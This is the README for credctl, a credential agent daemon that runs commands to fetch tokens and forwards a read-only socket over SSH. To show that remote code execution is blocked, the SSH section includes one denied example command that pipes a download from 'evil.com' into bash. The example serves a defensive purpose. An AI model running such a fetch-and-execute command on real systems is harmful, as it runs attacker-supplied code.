# credctl

A tiny SSH-forwardable credential agent for Unix systems (macOS/Linux).

## Overview

`credctl` is a credential agent daemon that executes commands to retrieve credentials on demand. It supports multiple output formats (raw, env variables, files), interactive login flows, and provides secure remote access via SSH socket forwarding.

## Installation

### Using Make (recommended)

```bash
make install
```

This will build and install `credctl` to `$(go env GOPATH)/bin` (usually `~/go/bin`).

Make sure `$(go env GOPATH)/bin` is in your PATH:
```bash
# Add to ~/.bashrc, ~/.zshrc, or equivalent
export PATH="$(go env GOPATH)/bin:$PATH"
```

You can customize the installation directory:

```bash
# Install to /usr/local/bin instead
make install PREFIX=/usr/local

# Install to ~/.local/bin
make install PREFIX=~/.local

# Just build without installing
make build
```

### Manual installation

```bash
go build -o credctl
mv credctl $(go env GOPATH)/bin/
# or
sudo mv credctl /usr/local/bin/
```

### Uninstall

```bash
make uninstall
```

## Quick Start

### 1. Start the daemon

```bash
eval $(credctl daemon)
```

This exports `CREDCTL_SOCK`, `CREDCTL_PID`, and `CREDCTL_LOGS` environment variables.

### 2. Add credential providers

```bash
# GitHub token with interactive login
credctl add command gh --command "gh auth token" \
  --login_command "gh auth login --web --clipboard -p https" \
  --run-login
```

### 3. Get credentials

```bash
credctl get gh              # Raw output
```

### 4. Re-authenticate when needed

```bash
# Run login command for a provider
credctl login gh            # Executes: gh auth login --web --clipboard -p https
```

### 5. Export/Import providers

```bash
# Export all providers to JSON
credctl export > providers.json

# Import providers from file or stdin
credctl import providers.json
curl https://company.com/providers.json | credctl import

# Overwrite existing providers
credctl import --overwrite providers.json
```

## Remote Usage with SSH

The daemon creates two sockets:
- **Admin socket**: Full access (add, get, delete)
- **Read-only socket**: Only get operations

### Forward read-only socket for secure remote access

**SSH with socket forwarding:**
```bash
ssh -R /tmp/credctl.sock:$HOME/.credctl/agent-readonly.sock user@remote
```

**On remote host:**
```bash
export CREDCTL_SOCK=/tmp/credctl.sock

# Get credentials (allowed)
credctl get gh             # ✓ Works

# Modify providers (blocked - prevents RCE)
credctl add command malicious --command "curl evil.com | bash"  # ✗ Permission denied
```

By forwarding the read-only socket, remote systems can retrieve credentials but cannot execute arbitrary commands on your machine.

## Viewing Logs

```bash
# View logs in real-time
tail -f $CREDCTL_LOGS

# Search for errors
grep error $CREDCTL_LOGS
```